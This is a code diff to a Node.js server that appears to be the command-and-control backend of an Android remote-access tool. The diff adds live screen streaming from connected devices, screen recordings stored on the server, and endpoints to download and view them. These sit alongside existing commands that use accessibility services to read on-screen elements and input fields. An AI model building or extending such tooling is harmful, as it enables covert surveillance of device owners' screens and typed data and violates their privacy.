@@ -29,6 +29,13 @@ const PONG_TIMEOUT   = 45000;   // ms – drop if no pong received
 const CMD_TIMEOUT_MS = 30000;   // ms – command timeout
 
 // ============================================
+// RECORDINGS STORAGE
+// ============================================
+const RECORDINGS_DIR = path.join(__dirname, 'recordings');
+if (!fs.existsSync(RECORDINGS_DIR)) fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
+const activeRecordings = new Map(); // deviceId → { frames:[], startTime }
+
+// ============================================
 // COMMAND REGISTRY  (all cmds from SocketManager.java)
 // ============================================
 const COMMANDS = {
@@ -106,7 +113,16 @@ const COMMANDS = {
     get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
     get_input_fields:          { category: 'screen_reader',label: 'Input Fields',          icon: '✏️'  },
     // Accessibility check
-    get_accessibility_status:  { category: 'system',       label: 'Accessibility Status',  icon: '♿' }
+    get_accessibility_status:  { category: 'system',       label: 'Accessibility Status',  icon: '♿' },
+    // Streaming
+    stream_start:                { category: 'streaming',   label: 'Start Stream',          icon: '📡' },
+    stream_stop:                 { category: 'streaming',   label: 'Stop Stream',           icon: '⏹️' },
+    // Screen Recording (saved on device)
+    screen_record_start:         { category: 'streaming',   label: 'Start Screen Rec',      icon: '🔴' },
+    screen_record_stop:          { category: 'streaming',   label: 'Stop Screen Rec',       icon: '⏹️' },
+    screen_record_list_local:    { category: 'streaming',   label: 'List Local Recs',       icon: '🎬' },
+    screen_record_delete_local:  { category: 'streaming',   label: 'Delete Local Rec',      icon: '🗑️' },
+    screen_record_get_local:     { category: 'streaming',   label: 'Get Local Rec',         icon: '📥' }
 };
 
 // ============================================
@@ -138,6 +154,8 @@ const wsClients  = new Map();          // clientId → WebSocket
 const deviceToTcp = new Map();         // deviceId → TCP connId
 /** @type {Map<string, {wsId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
 const pendingCmds = new Map();         // commandId → pending info
+/** @type {Map<string, Object>} In-memory device registry for when MongoDB is unavailable */
+const inMemoryDevices = new Map();     // deviceId → device object
 
 // ============================================
 // LOGGING HELPERS
@@ -198,11 +216,17 @@ async function processMessage(clientId, clientType, event, data) {
             deviceToTcp.set(deviceId, clientId);
         }
 
-        // Persist / update
+        // Always update in-memory registry
+        const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
+                       androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name };
+        const existing = inMemoryDevices.get(deviceId) || {};
+        inMemoryDevices.set(deviceId, { ...existing, deviceId,
+            deviceName: deviceInfo?.name || deviceId, deviceInfo: info,
+            isOnline: true, lastSeen: new Date() });
+
+        // Persist / update (optional MongoDB)
         try {
             let dev = await Device.findOne({ deviceId });
-            const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
-                           androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name };
             if (!dev) {
                 dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
                                    deviceInfo: info, isOnline: true });
@@ -228,6 +252,9 @@ async function processMessage(clientId, clientType, event, data) {
         if (!deviceId) return;
         const conn = tcpClients.get(clientId);
         if (conn) conn.lastPong = Date.now();
+        // Update in-memory registry
+        const existing = inMemoryDevices.get(deviceId);
+        if (existing) inMemoryDevices.set(deviceId, { ...existing, isOnline: true, lastSeen: new Date() });
         try { await Device.findOneAndUpdate({ deviceId }, { lastSeen: new Date(), isOnline: true }); } catch (e) {}
         broadcastDash('device:heartbeat', { deviceId, timestamp: new Date() });
         return;
@@ -236,6 +263,21 @@ async function processMessage(clientId, clientType, event, data) {
     if (event === 'device:pong') {
         const conn = tcpClients.get(clientId);
         if (conn) conn.lastPong = Date.now();
+        return;
+    }
+
+    // ── Stream frame from Android ────────────────────────────────────
+    if (event === 'stream:frame') {
+        const conn = tcpClients.get(clientId);
+        const deviceId = conn?.deviceId;
+        if (!deviceId) return;
+        const frameData = data?.frameData;
+        if (!frameData) return;
+        // Relay to all dashboard clients
+        broadcastDash('stream:frame', { deviceId, frameData, timestamp: data.timestamp || Date.now() });
+        // Buffer if server-side recording is active
+        const rec = activeRecordings.get(deviceId);
+        if (rec) rec.frames.push({ frameData, timestamp: data.timestamp || Date.now() });
         return;
     }
 
@@ -287,6 +329,43 @@ async function processMessage(clientId, clientType, event, data) {
     if (event === 'commands:get_registry') {
         const ws = wsClients.get(clientId);
         if (ws) wsSend(ws, 'commands:registry', COMMANDS);
+        return;
+    }
+
+    if (event === 'recording:start') {
+        const { deviceId } = data || {};
+        if (!deviceId) return;
+        const recWs = wsClients.get(clientId);
+        if (!activeRecordings.has(deviceId)) {
+            activeRecordings.set(deviceId, { frames: [], startTime: Date.now() });
+        }
+        if (recWs) wsSend(recWs, 'recording:started', { deviceId });
+        return;
+    }
+
+    if (event === 'recording:stop') {
+        const { deviceId } = data || {};
+        if (!deviceId) return;
+        const recWs = wsClients.get(clientId);
+        const rec = activeRecordings.get(deviceId);
+        if (!rec) return;
+        activeRecordings.delete(deviceId);
+        try {
+            const deviceDir = path.join(RECORDINGS_DIR, deviceId.replace(/[^a-zA-Z0-9_-]/g, '_'));
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            const filename = `rec_${Date.now()}.json`;
+            const filePath = path.join(deviceDir, filename);
+            fs.writeFileSync(filePath, JSON.stringify({
+                deviceId,
+                startTime: rec.startTime,
+                endTime: Date.now(),
+                frameCount: rec.frames.length,
+                frames: rec.frames
+            }));
+            if (recWs) wsSend(recWs, 'recording:saved', { deviceId, filename, frameCount: rec.frames.length });
+        } catch (e) {
+            if (recWs) wsSend(recWs, 'recording:error', { deviceId, message: e.message });
+        }
         return;
     }
 
@@ -488,6 +567,57 @@ app.get('/api/admin/users', async (req, res) => {
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
+// ── Recordings REST API ─────────────────────────────────────────────
+app.get('/api/recordings/:deviceId', (req, res) => {
+    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
+    const deviceDir = path.join(RECORDINGS_DIR, safeId);
+    if (!fs.existsSync(deviceDir)) return res.json({ recordings: [] });
+    try {
+        const files = fs.readdirSync(deviceDir).filter(f => f.endsWith('.json'));
+        const recordings = files.map(f => {
+            const fp = path.join(deviceDir, f);
+            const stat = fs.statSync(fp);
+            let extra = {};
+            try {
+                const raw = JSON.parse(fs.readFileSync(fp, 'utf8'));
+                extra = { frameCount: raw.frameCount, startTime: raw.startTime, endTime: raw.endTime };
+            } catch (_) {}
+            return { filename: f, size: stat.size, modified: stat.mtime, ...extra };
+        }).sort((a, b) => new Date(b.modified) - new Date(a.modified));
+        res.json({ recordings });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.delete('/api/recordings/:deviceId/:filename', (req, res) => {
+    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
+    const safeName = path.basename(req.params.filename);
+    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
+    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
+    try { fs.unlinkSync(fp); res.json({ success: true }); }
+    catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.get('/api/recordings/:deviceId/:filename', (req, res) => {
+    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
+    const safeName = path.basename(req.params.filename);
+    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
+    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
+    res.download(fp);
+});
+
+app.get('/api/recordings/:deviceId/:filename/view', (req, res) => {
+    const safeId = req.params.deviceId.replace(/[^a-zA-Z0-9_-]/g, '_');
+    const safeName = path.basename(req.params.filename);
+    const fp = path.join(RECORDINGS_DIR, safeId, safeName);
+    if (!fs.existsSync(fp)) return res.status(404).json({ error: 'Not found' });
+    try {
+        const data = JSON.parse(fs.readFileSync(fp, 'utf8'));
+        res.json(data);
+    } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
 app.get('*', (req, res) => {
     const fp = path.join(__dirname, '../frontend', req.path);
     if (fs.existsSync(fp) && fs.statSync(fp).isFile()) res.sendFile(fp);
@@ -500,15 +630,28 @@ app.get('*', (req, res) => {
 async function broadcastDeviceList() {
     try {
         const devices = await Device.find().sort({ lastSeen: -1 });
-        broadcastDash('device:list', devices);
-    } catch (e) {}
+        if (devices && devices.length > 0) {
+            broadcastDash('device:list', devices);
+        } else {
+            broadcastDash('device:list', Array.from(inMemoryDevices.values()));
+        }
+    } catch (e) {
+        broadcastDash('device:list', Array.from(inMemoryDevices.values()));
+    }
 }
 
 async function sendDeviceListTo(ws) {
     try {
         const devices = await Device.find().sort({ lastSeen: -1 });
-        wsSend(ws, 'device:list', devices);
-    } catch (e) { wsSend(ws, 'device:list', []); }
+        if (devices && devices.length > 0) {
+            wsSend(ws, 'device:list', devices);
+        } else {
+            // Fallback to in-memory registry
+            wsSend(ws, 'device:list', Array.from(inMemoryDevices.values()));
+        }
+    } catch (e) {
+        wsSend(ws, 'device:list', Array.from(inMemoryDevices.values()));
+    }
 }
 
 // ============================================
